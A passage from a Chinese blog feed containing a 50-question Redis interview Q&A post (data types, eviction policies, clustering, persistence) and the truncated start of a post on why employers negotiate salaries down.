            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis 面试题 50 问，史上最全。</title>
      <link href="/2025/10/30/%E9%9D%A2%E8%AF%95/Redis%20%E9%9D%A2%E8%AF%95%E9%A2%98%2050%20%E9%97%AE%EF%BC%8C%E5%8F%B2%E4%B8%8A%E6%9C%80%E5%85%A8%E3%80%82/"/>
      <url>/2025/10/30/%E9%9D%A2%E8%AF%95/Redis%20%E9%9D%A2%E8%AF%95%E9%A2%98%2050%20%E9%97%AE%EF%BC%8C%E5%8F%B2%E4%B8%8A%E6%9C%80%E5%85%A8%E3%80%82/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-2-2/29383437.jpg" alt="image"></p><h5 id="1、什么是Redis？"><a href="#1、什么是Redis？" class="headerlink" title="1、什么是Redis？"></a>1、什么是Redis？</h5><p>Redis本质上是一个Key-Value类型的内存数据库，很像memcached，整个数据库统统加载在内存当中进行操作，定期通过异步操作把数据库数据flush到硬盘上进行保存。因为是纯内存操作，Redis的性能非常出色，每秒可以处理超过 10万次读写操作，是已知性能最快的Key-Value DB。<br>Redis的出色之处不仅仅是性能，Redis最大的魅力是支持保存多种数据结构，此外单个value的最大限制是1GB，不像 memcached只能保存1MB的数据，因此Redis可以用来实现很多有用的功能，比方说用他的List来做FIFO双向链表，实现一个轻量级的高性 能消息队列服务，用他的Set可以做高性能的tag系统等等。另外Redis也可以对存入的Key-Value设置expire时间，因此也可以被当作一 个功能加强版的memcached来用。<br>Redis的主要缺点是数据库容量受到物理内存的限制，不能用作海量数据的高性能读写，因此Redis适合的场景主要局限在较小数据量的高性能操作和运算上。</p><h5 id="2、Redis相比memcached有哪些优势？"><a href="#2、Redis相比memcached有哪些优势？" class="headerlink" title="2、Redis相比memcached有哪些优势？"></a>2、Redis相比memcached有哪些优势？</h5><p>(1) memcached所有的值均是简单的字符串，redis作为其替代者，支持更为丰富的数据类型</p><p>(2) redis的速度比memcached快很多</p><p>(3) redis可以持久化其数据</p><h5 id="3、Redis支持哪几种数据类型？"><a href="#3、Redis支持哪几种数据类型？" class="headerlink" title="3、Redis支持哪几种数据类型？"></a>3、Redis支持哪几种数据类型？</h5><p>String、List、Set、Sorted Set、hashes</p><h5 id="4、Redis主要消耗什么物理资源？"><a href="#4、Redis主要消耗什么物理资源？" class="headerlink" title="4、Redis主要消耗什么物理资源？"></a>4、Redis主要消耗什么物理资源？</h5><p>内存。</p><h5 id="5、Redis的全称是什么？"><a href="#5、Redis的全称是什么？" class="headerlink" title="5、Redis的全称是什么？"></a>5、Redis的全称是什么？</h5><p>Remote Dictionary Server。</p><h5 id="6、Redis有哪几种数据淘汰策略？"><a href="#6、Redis有哪几种数据淘汰策略？" class="headerlink" title="6、Redis有哪几种数据淘汰策略？"></a>6、Redis有哪几种数据淘汰策略？</h5><p>noeviction:返回错误当内存限制达到并且客户端尝试执行会让更多内存被使用的命令（大部分的写入指令，但DEL和几个例外）</p><p>allkeys-lru: 尝试回收最少使用的键（LRU），使得新添加的数据有空间存放。</p><p>volatile-lru: 尝试回收最少使用的键（LRU），但仅限于在过期集合的键,使得新添加的数据有空间存放。</p><p>allkeys-random: 回收随机的键使得新添加的数据有空间存放。</p><p>volatile-random: 回收随机的键使得新添加的数据有空间存放，但仅限于在过期集合的键。</p><p>volatile-ttl: 回收在过期集合的键，并且优先回收存活时间（TTL）较短的键,使得新添加的数据有空间存放。</p><h5 id="7、Redis官方为什么不提供Windows版本？"><a href="#7、Redis官方为什么不提供Windows版本？" class="headerlink" title="7、Redis官方为什么不提供Windows版本？"></a>7、Redis官方为什么不提供Windows版本？</h5><p>因为目前Linux版本已经相当稳定，而且用户量很大，无需开发windows版本，反而会带来兼容性等问题。</p><h5 id="8、一个字符串类型的值能存储最大容量是多少？"><a href="#8、一个字符串类型的值能存储最大容量是多少？" class="headerlink" title="8、一个字符串类型的值能存储最大容量是多少？"></a>8、一个字符串类型的值能存储最大容量是多少？</h5><p>512M</p><h5 id="9、为什么Redis需要把所有数据放到内存中？"><a href="#9、为什么Redis需要把所有数据放到内存中？" class="headerlink" title="9、为什么Redis需要把所有数据放到内存中？"></a>9、为什么Redis需要把所有数据放到内存中？</h5><p>Redis为了达到最快的读写速度将数据都读到内存中，并通过异步的方式将数据写入磁盘。所以redis具有快速和数据持久化的特征。如果不将数据放在内存中，磁盘I&#x2F;O速度为严重影响redis的性能。在内存越来越便宜的今天，redis将会越来越受欢迎。<br>如果设置了最大使用的内存，则数据已有记录数达到内存限值后不能继续插入新值。</p><h5 id="10、Redis集群方案应该怎么做？都有哪些方案？"><a href="#10、Redis集群方案应该怎么做？都有哪些方案？" class="headerlink" title="10、Redis集群方案应该怎么做？都有哪些方案？"></a>10、Redis集群方案应该怎么做？都有哪些方案？</h5><p>1.twemproxy，大概概念是，它类似于一个代理方式，使用方法和普通redis无任何区别，设置好它下属的多个redis实例后，使用时在本需要连接redis的地方改为连接twemproxy，它会以一个代理的身份接收请求并使用一致性hash算法，将请求转接到具体redis，将结果再返回twemproxy。使用方式简便(相对redis只需修改连接端口)，对旧项目扩展的首选。 问题：twemproxy自身单端口实例的压力，使用一致性hash后，对redis节点数量改变时候的计算值的改变，数据无法自动移动到新的节点。</p><p>2.codis，目前用的最多的集群方案，基本和twemproxy一致的效果，但它支持在 节点数量改变情况下，旧节点数据可恢复到新hash节点。</p><p>3.redis cluster3.0自带的集群，特点在于他的分布式算法不是一致性hash，而是hash槽的概念，以及自身支持节点设置从节点。具体看官方文档介绍。</p><p>4.在业务代码层实现，起几个毫无关联的redis实例，在代码层，对key 进行hash计算，然后去对应的redis实例操作数据。 这种方式对hash层代码要求比较高，考虑部分包括，节点失效后的替代算法方案，数据震荡后的自动脚本恢复，实例的监控，等等。</p><h5 id="11、Redis集群方案什么情况下会导致整个集群不可用？"><a href="#11、Redis集群方案什么情况下会导致整个集群不可用？" class="headerlink" title="11、Redis集群方案什么情况下会导致整个集群不可用？"></a>11、Redis集群方案什么情况下会导致整个集群不可用？</h5><p>有A，B，C三个节点的集群,在没有复制模型的情况下,如果节点B失败了，那么整个集群就会以为缺少5501-11000这个范围的槽而不可用。</p><h5 id="12、MySQL里有2000w数据，redis中只存20w的数据，如何保证redis中的数据都是热点数据？"><a href="#12、MySQL里有2000w数据，redis中只存20w的数据，如何保证redis中的数据都是热点数据？" class="headerlink" title="12、MySQL里有2000w数据，redis中只存20w的数据，如何保证redis中的数据都是热点数据？"></a>12、MySQL里有2000w数据，redis中只存20w的数据，如何保证redis中的数据都是热点数据？</h5><p>redis内存数据集大小上升到一定大小的时候，就会施行数据淘汰策略。</p><h5 id="13、Redis有哪些适合的场景？"><a href="#13、Redis有哪些适合的场景？" class="headerlink" title="13、Redis有哪些适合的场景？"></a>13、Redis有哪些适合的场景？</h5><p>（1）、会话缓存（Session Cache）</p><p>最常用的一种使用Redis的情景是会话缓存（session cache）。用Redis缓存会话比其他存储（如Memcached）的优势在于：Redis提供持久化。当维护一个不是严格要求一致性的缓存时，如果用户的购物车信息全部丢失，大部分人都会不高兴的，现在，他们还会这样吗？</p><p>幸运的是，随着 Redis 这些年的改进，很容易找到怎么恰当的使用Redis来缓存会话的文档。甚至广为人知的商业平台Magento也提供Redis的插件。</p><p>（2）、全页缓存（FPC）</p><p>除基本的会话token之外，Redis还提供很简便的FPC平台。回到一致性问题，即使重启了Redis实例，因为有磁盘的持久化，用户也不会看到页面加载速度的下降，这是一个极大改进，类似PHP本地FPC。</p><p>再次以Magento为例，Magento提供一个插件来使用Redis作为全页缓存后端。</p><p>此外，对WordPress的用户来说，Pantheon有一个非常好的插件 wp-redis，这个插件能帮助你以最快速度加载你曾浏览过的页面。</p><p>（3）、队列</p><p>Reids在内存存储引擎领域的一大优点是提供 list 和 set 操作，这使得Redis能作为一个很好的消息队列平台来使用。Redis作为队列使用的操作，就类似于本地程序语言（如Python）对 list 的 push&#x2F;pop 操作。</p><p>如果你快速的在Google中搜索“Redis queues”，你马上就能找到大量的开源项目，这些项目的目的就是利用Redis创建非常好的后端工具，以满足各种队列需求。例如，Celery有一个后台就是使用Redis作为broker，你可以从这里去查看。</p><p>（4），排行榜&#x2F;计数器</p><p>Redis在内存中对数字进行递增或递减的操作实现的非常好。集合（Set）和有序集合（Sorted Set）也使得我们在执行这些操作的时候变的非常简单，Redis只是正好提供了这两种数据结构。所以，我们要从排序集合中获取到排名最靠前的10个用户–我们称之为“user_scores”，我们只需要像下面一样执行即可：</p><p>当然，这是假定你是根据你用户的分数做递增的排序。如果你想返回用户及用户的分数，你需要这样执行：</p><p>ZRANGE user_scores 0 10 WITHSCORES</p><p>Agora Games就是一个很好的例子，用Ruby实现的，它的排行榜就是使用Redis来存储数据的，你可以在这里看到。</p><p>（5）、发布&#x2F;订阅</p><p>最后（但肯定不是最不重要的）是Redis的发布&#x2F;订阅功能。发布&#x2F;订阅的使用场景确实非常多。我已看见人们在社交网络连接中使用，还可作为基于发布&#x2F;订阅的脚本触发器，甚至用Redis的发布&#x2F;订阅功能来建立聊天系统！（不，这是真的，你可以去核实）。</p><h5 id="14、Redis支持的Java客户端都有哪些？官方推荐用哪个？"><a href="#14、Redis支持的Java客户端都有哪些？官方推荐用哪个？" class="headerlink" title="14、Redis支持的Java客户端都有哪些？官方推荐用哪个？"></a>14、Redis支持的Java客户端都有哪些？官方推荐用哪个？</h5><p>Redisson、Jedis、lettuce等等，官方推荐使用Redisson。</p><h5 id="15、Redis和Redisson有什么关系？"><a href="#15、Redis和Redisson有什么关系？" class="headerlink" title="15、Redis和Redisson有什么关系？"></a>15、Redis和Redisson有什么关系？</h5><p>Redisson是一个高级的分布式协调Redis客服端，能帮助用户在分布式环境中轻松实现一些Java的对象 (Bloom filter, BitSet, Set, SetMultimap, ScoredSortedSet, SortedSet, Map, ConcurrentMap, List, ListMultimap, Queue, BlockingQueue, Deque, BlockingDeque, Semaphore, Lock, ReadWriteLock, AtomicLong, CountDownLatch, Publish &#x2F; Subscribe, HyperLogLog)。</p><h5 id="16、Jedis与Redisson对比有什么优缺点？"><a href="#16、Jedis与Redisson对比有什么优缺点？" class="headerlink" title="16、Jedis与Redisson对比有什么优缺点？"></a>16、Jedis与Redisson对比有什么优缺点？</h5><p>Jedis是Redis的Java实现的客户端，其API提供了比较全面的Redis命令的支持；Redisson实现了分布式和可扩展的Java数据结构，和Jedis相比，功能较为简单，不支持字符串操作，不支持排序、事务、管道、分区等Redis特性。Redisson的宗旨是促进使用者对Redis的关注分离，从而让使用者能够将精力更集中地放在处理业务逻辑上。</p><h5 id="17、Redis如何设置密码及验证密码？"><a href="#17、Redis如何设置密码及验证密码？" class="headerlink" title="17、Redis如何设置密码及验证密码？"></a>17、Redis如何设置密码及验证密码？</h5><p>设置密码：config set requirepass 123456</p><p>授权密码：auth 123456</p><h5 id="18、说说Redis哈希槽的概念？"><a href="#18、说说Redis哈希槽的概念？" class="headerlink" title="18、说说Redis哈希槽的概念？"></a>18、说说Redis哈希槽的概念？</h5><p>Redis集群没有使用一致性hash,而是引入了哈希槽的概念，Redis集群有16384个哈希槽，每个key通过CRC16校验后对16384取模来决定放置哪个槽，集群的每个节点负责一部分hash槽。</p><h5 id="19、Redis集群的主从复制模型是怎样的？"><a href="#19、Redis集群的主从复制模型是怎样的？" class="headerlink" title="19、Redis集群的主从复制模型是怎样的？"></a>19、Redis集群的主从复制模型是怎样的？</h5><p>为了使在部分节点失败或者大部分节点无法通信的情况下集群仍然可用，所以集群使用了主从复制模型,每个节点都会有N-1个复制品.</p><h5 id="20、Redis集群会有写操作丢失吗？为什么？"><a href="#20、Redis集群会有写操作丢失吗？为什么？" class="headerlink" title="20、Redis集群会有写操作丢失吗？为什么？"></a>20、Redis集群会有写操作丢失吗？为什么？</h5><p>Redis并不能保证数据的强一致性，这意味这在实际中集群在特定的条件下可能会丢失写操作。</p><h5 id="21、Redis集群之间是如何复制的？"><a href="#21、Redis集群之间是如何复制的？" class="headerlink" title="21、Redis集群之间是如何复制的？"></a>21、Redis集群之间是如何复制的？</h5><p>异步复制</p><h5 id="22、Redis集群最大节点个数是多少？"><a href="#22、Redis集群最大节点个数是多少？" class="headerlink" title="22、Redis集群最大节点个数是多少？"></a>22、Redis集群最大节点个数是多少？</h5><p>16384个。</p><h5 id="23、Redis集群如何选择数据库？"><a href="#23、Redis集群如何选择数据库？" class="headerlink" title="23、Redis集群如何选择数据库？"></a>23、Redis集群如何选择数据库？</h5><p>Redis集群目前无法做数据库选择，默认在0数据库。</p><h5 id="24、怎么测试Redis的连通性？"><a href="#24、怎么测试Redis的连通性？" class="headerlink" title="24、怎么测试Redis的连通性？"></a>24、怎么测试Redis的连通性？</h5><p>ping</p><h5 id="25、Redis中的管道有什么用？"><a href="#25、Redis中的管道有什么用？" class="headerlink" title="25、Redis中的管道有什么用？"></a>25、Redis中的管道有什么用？</h5><p>一次请求&#x2F;响应服务器能实现处理新的请求即使旧的请求还未被响应。这样就可以将多个命令发送到服务器，而不用等待回复，最后在一个步骤中读取该答复。</p><p>这就是管道（pipelining），是一种几十年来广泛使用的技术。例如许多POP3协议已经实现支持这个功能，大大加快了从服务器下载新邮件的过程。</p><h5 id="26、怎么理解Redis事务？"><a href="#26、怎么理解Redis事务？" class="headerlink" title="26、怎么理解Redis事务？"></a>26、怎么理解Redis事务？</h5><p>事务是一个单独的隔离操作：事务中的所有命令都会序列化、按顺序地执行。事务在执行的过程中，不会被其他客户端发送来的命令请求所打断。</p><p>事务是一个原子操作：事务中的命令要么全部被执行，要么全部都不执行。</p><h5 id="27、Redis事务相关的命令有哪几个？"><a href="#27、Redis事务相关的命令有哪几个？" class="headerlink" title="27、Redis事务相关的命令有哪几个？"></a>27、Redis事务相关的命令有哪几个？</h5><p>MULTI、EXEC、DISCARD、WATCH</p><h5 id="28、Redis-key的过期时间和永久有效分别怎么设置？"><a href="#28、Redis-key的过期时间和永久有效分别怎么设置？" class="headerlink" title="28、Redis key的过期时间和永久有效分别怎么设置？"></a>28、Redis key的过期时间和永久有效分别怎么设置？</h5><p>EXPIRE和PERSIST命令。</p><h5 id="29、Redis如何做内存优化？"><a href="#29、Redis如何做内存优化？" class="headerlink" title="29、Redis如何做内存优化？"></a>29、Redis如何做内存优化？</h5><p>尽可能使用散列表（hashes），散列表（是说散列表里面存储的数少）使用的内存非常小，所以你应该尽可能的将你的数据模型抽象到一个散列表里面。比如你的web系统中有一个用户对象，不要为这个用户的名称，姓氏，邮箱，密码设置单独的key,而是应该把这个用户的所有信息存储到一张散列表里面.</p><h5 id="30、Redis回收进程如何工作的？"><a href="#30、Redis回收进程如何工作的？" class="headerlink" title="30、Redis回收进程如何工作的？"></a>30、Redis回收进程如何工作的？</h5><ol><li>一个客户端运行了新的命令，添加了新的数据。</li><li>Redi检查内存使用情况，如果大于maxmemory的限制, 则根据设定好的策略进行回收。</li><li>一个新的命令被执行，等等。</li><li>所以我们不断地穿越内存限制的边界，通过不断达到边界然后不断地回收回到边界以下。</li></ol><p>如果一个命令的结果导致大量内存被使用（例如很大的集合的交集保存到一个新的键），不用多久内存限制就会被这个内存使用量超越。</p><h5 id="31、Redis回收使用的是什么算法？"><a href="#31、Redis回收使用的是什么算法？" class="headerlink" title="31、Redis回收使用的是什么算法？"></a>31、Redis回收使用的是什么算法？</h5><p>LRU算法</p><h5 id="32、Redis如何做大量数据插入？"><a href="#32、Redis如何做大量数据插入？" class="headerlink" title="32、Redis如何做大量数据插入？"></a>32、Redis如何做大量数据插入？</h5><p>Redis2.6开始redis-cli支持一种新的被称之为pipe mode的新模式用于执行大量数据插入工作。</p><h5 id="33、为什么要做Redis分区？"><a href="#33、为什么要做Redis分区？" class="headerlink" title="33、为什么要做Redis分区？"></a>33、为什么要做Redis分区？</h5><p>分区可以让Redis管理更大的内存，Redis将可以使用所有机器的内存。如果没有分区，你最多只能使用一台机器的内存。分区使Redis的计算能力通过简单地增加计算机得到成倍提升,Redis的网络带宽也会随着计算机和网卡的增加而成倍增长。</p><h5 id="34、你知道有哪些Redis分区实现方案？"><a href="#34、你知道有哪些Redis分区实现方案？" class="headerlink" title="34、你知道有哪些Redis分区实现方案？"></a>34、你知道有哪些Redis分区实现方案？</h5><ol><li><p>客户端分区就是在客户端就已经决定数据会被存储到哪个redis节点或者从哪个redis节点读取。大多数客户端已经实现了客户端分区。</p></li><li><p>代理分区 意味着客户端将请求发送给代理，然后代理决定去哪个节点写数据或者读数据。代理根据分区规则决定请求哪些Redis实例，然后根据Redis的响应结果返回给客户端。redis和memcached的一种代理实现就是Twemproxy</p></li><li><p>查询路由(Query routing) 的意思是客户端随机地请求任意一个redis实例，然后由Redis将请求转发给正确的Redis节点。Redis Cluster实现了一种混合形式的查询路由，但并不是直接将请求从一个redis节点转发到另一个redis节点，而是在客户端的帮助下直接redirected到正确的redis节点。</p></li></ol><h5 id="35、Redis分区有什么缺点？"><a href="#35、Redis分区有什么缺点？" class="headerlink" title="35、Redis分区有什么缺点？"></a>35、Redis分区有什么缺点？</h5><ul><li>涉及多个key的操作通常不会被支持。例如你不能对两个集合求交集，因为他们可能被存储到不同的Redis实例（实际上这种情况也有办法，但是不能直接使用交集指令）。</li><li>同时操作多个key,则不能使用Redis事务.</li><li>分区使用的粒度是key，不能使用一个非常长的排序key存储一个数据集（The partitioning granularity is the key, so it is not possible to shard a dataset with a single huge key like a very big sorted set）.</li><li>当使用分区的时候，数据处理会非常复杂，例如为了备份你必须从不同的Redis实例和主机同时收集RDB &#x2F; AOF文件。</li><li>分区时动态扩容或缩容可能非常复杂。Redis集群在运行时增加或者删除Redis节点，能做到最大程度对用户透明地数据再平衡，但其他一些客户端分区或者代理分区方法则不支持这种特性。然而，有一种预分片的技术也可以较好的解决这个问题。</li></ul><h5 id="36、Redis持久化数据和缓存怎么做扩容？"><a href="#36、Redis持久化数据和缓存怎么做扩容？" class="headerlink" title="36、Redis持久化数据和缓存怎么做扩容？"></a>36、Redis持久化数据和缓存怎么做扩容？</h5><ul><li>如果Redis被当做缓存使用，使用一致性哈希实现动态扩容缩容。</li><li>如果Redis被当做一个持久化存储使用，必须使用固定的keys-to-nodes映射关系，节点的数量一旦确定不能变化。否则的话(即Redis节点需要动态变化的情况），必须使用可以在运行时进行数据再平衡的一套系统，而当前只有Redis集群可以做到这样。</li></ul><h5 id="37、分布式Redis是前期做还是后期规模上来了再做好？为什么？"><a href="#37、分布式Redis是前期做还是后期规模上来了再做好？为什么？" class="headerlink" title="37、分布式Redis是前期做还是后期规模上来了再做好？为什么？"></a>37、分布式Redis是前期做还是后期规模上来了再做好？为什么？</h5><p>既然Redis是如此的轻量（单实例只使用1M内存）,为防止以后的扩容，最好的办法就是一开始就启动较多实例。即便你只有一台服务器，你也可以一开始就让Redis以分布式的方式运行，使用分区，在同一台服务器上启动多个实例。</p><p>一开始就多设置几个Redis实例，例如32或者64个实例，对大多数用户来说这操作起来可能比较麻烦，但是从长久来看做这点牺牲是值得的。</p><p>这样的话，当你的数据不断增长，需要更多的Redis服务器时，你需要做的就是仅仅将Redis实例从一台服务迁移到另外一台服务器而已（而不用考虑重新分区的问题）。一旦你添加了另一台服务器，你需要将你一半的Redis实例从第一台机器迁移到第二台机器。</p><h5 id="38、Twemproxy是什么？"><a href="#38、Twemproxy是什么？" class="headerlink" title="38、Twemproxy是什么？"></a>38、Twemproxy是什么？</h5><p>Twemproxy是Twitter维护的（缓存）代理系统，代理Memcached的ASCII协议和Redis协议。它是单线程程序，使用c语言编写，运行起来非常快。它是采用Apache 2.0 license的开源软件。<br>Twemproxy支持自动分区，如果其代理的其中一个Redis节点不可用时，会自动将该节点排除（这将改变原来的keys-instances的映射关系，所以你应该仅在把Redis当缓存时使用Twemproxy)。<br>Twemproxy本身不存在单点问题，因为你可以启动多个Twemproxy实例，然后让你的客户端去连接任意一个Twemproxy实例。<br>Twemproxy是Redis客户端和服务器端的一个中间层，由它来处理分区功能应该不算复杂，并且应该算比较可靠的。</p><h5 id="39、支持一致性哈希的客户端有哪些？"><a href="#39、支持一致性哈希的客户端有哪些？" class="headerlink" title="39、支持一致性哈希的客户端有哪些？"></a>39、支持一致性哈希的客户端有哪些？</h5><p>Redis-rb、Predis等。</p><h5 id="40、Redis与其他key-value存储有什么不同？"><a href="#40、Redis与其他key-value存储有什么不同？" class="headerlink" title="40、Redis与其他key-value存储有什么不同？"></a>40、Redis与其他key-value存储有什么不同？</h5><ol><li>Redis有着更为复杂的数据结构并且提供对他们的原子性操作，这是一个不同于其他数据库的进化路径。Redis的数据类型都是基于基本数据结构的同时对程序员透明，无需进行额外的抽象。</li><li>Redis运行在内存中但是可以持久化到磁盘，所以在对不同数据集进行高速读写时需要权衡内存，应为数据量不能大于硬件内存。在内存数据库方面的另一个优点是， 相比在磁盘上相同的复杂的数据结构，在内存中操作起来非常简单，这样Redis可以做很多内部复杂性很强的事情。 同时，在磁盘格式方面他们是紧凑的以追加的方式产生的，因为他们并不需要进行随机访问。</li></ol><h5 id="41、Redis的内存占用情况怎么样？"><a href="#41、Redis的内存占用情况怎么样？" class="headerlink" title="41、Redis的内存占用情况怎么样？"></a>41、Redis的内存占用情况怎么样？</h5><p>给你举个例子： 100万个键值对（键是0到999999值是字符串“hello world”）在我的32位的Mac笔记本上 用了100MB。同样的数据放到一个key里只需要16MB， 这是因为键值有一个很大的开销。 在Memcached上执行也是类似的结果，但是相对Redis的开销要小一点点，因为Redis会记录类型信息引用计数等等。</p><p>当然，大键值对时两者的比例要好很多。</p><p>64位的系统比32位的需要更多的内存开销，尤其是键值对都较小时，这是因为64位的系统里指针占用了8个字节。 但是，当然，64位系统支持更大的内存，所以为了运行大型的Redis服务器或多或少的需要使用64位的系统。</p><h5 id="42、都有哪些办法可以降低Redis的内存使用情况呢？"><a href="#42、都有哪些办法可以降低Redis的内存使用情况呢？" class="headerlink" title="42、都有哪些办法可以降低Redis的内存使用情况呢？"></a>42、都有哪些办法可以降低Redis的内存使用情况呢？</h5><p>如果你使用的是32位的Redis实例，可以好好利用Hash,list,sorted set,set等集合类型数据，因为通常情况下很多小的Key-Value可以用更紧凑的方式存放到一起。</p><h5 id="43、查看Redis使用情况及状态信息用什么命令？"><a href="#43、查看Redis使用情况及状态信息用什么命令？" class="headerlink" title="43、查看Redis使用情况及状态信息用什么命令？"></a>43、查看Redis使用情况及状态信息用什么命令？</h5><p>info</p><h5 id="44、Redis的内存用完了会发生什么？"><a href="#44、Redis的内存用完了会发生什么？" class="headerlink" title="44、Redis的内存用完了会发生什么？"></a>44、Redis的内存用完了会发生什么？</h5><p>如果达到设置的上限，Redis的写命令会返回错误信息（但是读命令还可以正常返回。）或者你可以将Redis当缓存来使用配置淘汰机制，当Redis达到内存上限时会冲刷掉旧的内容。</p><h5 id="45、Redis是单线程的，如何提高多核CPU的利用率？"><a href="#45、Redis是单线程的，如何提高多核CPU的利用率？" class="headerlink" title="45、Redis是单线程的，如何提高多核CPU的利用率？"></a>45、Redis是单线程的，如何提高多核CPU的利用率？</h5><p>可以在同一个服务器部署多个Redis的实例，并把他们当作不同的服务器来使用，在某些时候，无论如何一个服务器是不够的，<br>所以，如果你想使用多个CPU，你可以考虑一下分片（shard）。</p><h5 id="46、一个Redis实例最多能存放多少的keys？List、Set、Sorted-Set他们最多能存放多少元素？"><a href="#46、一个Redis实例最多能存放多少的keys？List、Set、Sorted-Set他们最多能存放多少元素？" class="headerlink" title="46、一个Redis实例最多能存放多少的keys？List、Set、Sorted Set他们最多能存放多少元素？"></a>46、一个Redis实例最多能存放多少的keys？List、Set、Sorted Set他们最多能存放多少元素？</h5><p>理论上Redis可以处理多达232的keys，并且在实际中进行了测试，每个实例至少存放了2亿5千万的keys。我们正在测试一些较大的值。</p><p>任何list、set、和sorted set都可以放232个元素。</p><p>换句话说，Redis的存储极限是系统中的可用内存值。</p><h5 id="47、Redis常见性能问题和解决方案？"><a href="#47、Redis常见性能问题和解决方案？" class="headerlink" title="47、Redis常见性能问题和解决方案？"></a>47、Redis常见性能问题和解决方案？</h5><p>(1) Master最好不要做任何持久化工作，如RDB内存快照和AOF日志文件</p><p>(2) 如果数据比较重要，某个Slave开启AOF备份数据，策略设置为每秒同步一次</p><p>(3) 为了主从复制的速度和连接的稳定性，Master和Slave最好在同一个局域网内</p><p>(4) 尽量避免在压力很大的主库上增加从库</p><p>(5) 主从复制不要用图状结构，用单向链表结构更为稳定，即：Master &lt;- Slave1 &lt;- Slave2 &lt;- Slave3…</p><p>这样的结构方便解决单点故障问题，实现Slave对Master的替换。如果Master挂了，可以立刻启用Slave1做Master，其他不变。</p><h5 id="48、Redis提供了哪几种持久化方式？"><a href="#48、Redis提供了哪几种持久化方式？" class="headerlink" title="48、Redis提供了哪几种持久化方式？"></a>48、Redis提供了哪几种持久化方式？</h5><ol><li>RDB持久化方式能够在指定的时间间隔能对你的数据进行快照存储.</li><li>AOF持久化方式记录每次对服务器写的操作,当服务器重启的时候会重新执行这些命令来恢复原始的数据,AOF命令以redis协议追加保存每次写的操作到文件末尾.Redis还能对AOF文件进行后台重写,使得AOF文件的体积不至于过大.</li><li>如果你只希望你的数据在服务器运行的时候存在,你也可以不使用任何持久化方式.</li><li>你也可以同时开启两种持久化方式, 在这种情况下, 当redis重启的时候会优先载入AOF文件来恢复原始的数据,因为在通常情况下AOF文件保存的数据集要比RDB文件保存的数据集要完整.</li><li>最重要的事情是了解RDB和AOF持久化方式的不同,让我们以RDB持久化方式开始。</li></ol><h5 id="49、如何选择合适的持久化方式？"><a href="#49、如何选择合适的持久化方式？" class="headerlink" title="49、如何选择合适的持久化方式？"></a>49、如何选择合适的持久化方式？</h5><p>一般来说， 如果想达到足以媲美PostgreSQL的数据安全性， 你应该同时使用两种持久化功能。如果你非常关心你的数据， 但仍然可以承受数分钟以内的数据丢失，那么你可以只使用RDB持久化。</p><p>有很多用户都只使用AOF持久化，但并不推荐这种方式：因为定时生成RDB快照（snapshot）非常便于进行数据库备份， 并且 RDB 恢复数据集的速度也要比AOF恢复的速度要快，除此之外， 使用RDB还可以避免之前提到的AOF程序的bug。</p><h5 id="50、修改配置不重启Redis会实时生效吗？"><a href="#50、修改配置不重启Redis会实时生效吗？" class="headerlink" title="50、修改配置不重启Redis会实时生效吗？"></a>50、修改配置不重启Redis会实时生效吗？</h5><p>针对运行实例，有许多配置选项可以通过 CONFIG SET 命令进行修改，而无需执行任何形式的重启。 从 Redis 2.2 开始，可以从 AOF 切换到 RDB 的快照持久性或其他方式而不需要重启 Redis。检索 ‘CONFIG GET *’ 命令获取更多信息。</p><p>但偶尔重新启动是必须的，如为升级 Redis 程序到新的版本，或者当你需要修改某些目前 CONFIG 命令还不支持的配置参数的时候。</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么面试你要25K，HR只给你20K？</title>
      <link href="/2025/10/30/%E9%9D%A2%E8%AF%95/%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9D%A2%E8%AF%95%E4%BD%A0%E8%A6%8125K%EF%BC%8CHR%E5%8F%AA%E7%BB%99%E4%BD%A020K%EF%BC%9F/"/>
      <url>/2025/10/30/%E9%9D%A2%E8%AF%95/%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9D%A2%E8%AF%95%E4%BD%A0%E8%A6%8125K%EF%BC%8CHR%E5%8F%AA%E7%BB%99%E4%BD%A020K%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>周末了，我们来聊个轻松的话题，关于涨薪，哈哈~</p><p>前阵子，栈长给大家分享了《<a href="https://mp.weixin.qq.com/s/LqLomUfxFQod0bGLZSERrg">为什么公司宁愿 25K 重新招人，也不给你加到 20K？</a>》，今天我们来聊一个差不多的话题：</p><p><strong>为什么面试你要25K，HR只给你20K？</strong></p><p>今天的这个标题只是个例子，至少栈长我曾经是遇到过这种情况，我曾经面试要 25K，对方公司确只能给我 23K，有的只给 20K，最后妥协或者不了了之。。</p><p>为什么面试时，你提出的薪资要求，公司总要砍你价，总是不能达到你的预期？所以，我觉得有必要了解这些道道，知己知彼，才能百战百胜。</p><p><strong>1、成本</strong></p><p>就像我们出去买东西一样，能还价的我们都会习惯性的去还价，谁都想将自己的成本控制到最低，谁都不是傻子。</p><p>更何况是资本家，HR（人力资源）角色就是要帮企业控制人力成本，用最少的钱招到最合适的人。</p><p>所以被压价是正常现象，如果 HR 不压价，反而有问题，就要反思是不是自己薪资要的太低了。</p><p><strong>2、制度</strong></p><p>每个公司都有每个公司的薪酬制度，不同的岗位都有其对应的薪资范围。</p><p>第一，如果你应聘的岗位，你要的价钱超过了应聘公司的薪资范围，公司也很难满足你的期望；</p><p>第二，如果你岗位上不去，薪资也很难上得去。比如一个普通开发岗位，你再怎么跳槽，我想你工资早晚会到天花板。</p><p><strong>3、稳定性</strong></p><p>如果你期望的薪资超过了现有人员的大致水平，从公司整体人员稳定性来考虑也是非常不利的，自然也很难满足你的期望的，企业只会根据目前的整体情况给你定价。</p><p>所以，你想进某家公司，最好提前了解一下这个公司的薪资结构和整体水平，以免被坑或者谈不好薪水。</p><p><strong>4、适配性</strong></p><p>如果你的技术能力或者业务能力不是非常适配公司发展的要求，而要的薪资又不低，压你价就是理所当然了。</p><p>所以，你要拿高薪，首先适配程度要非常高，在某个领域非常有经验，其次技术要过硬，这样你才能和 HR 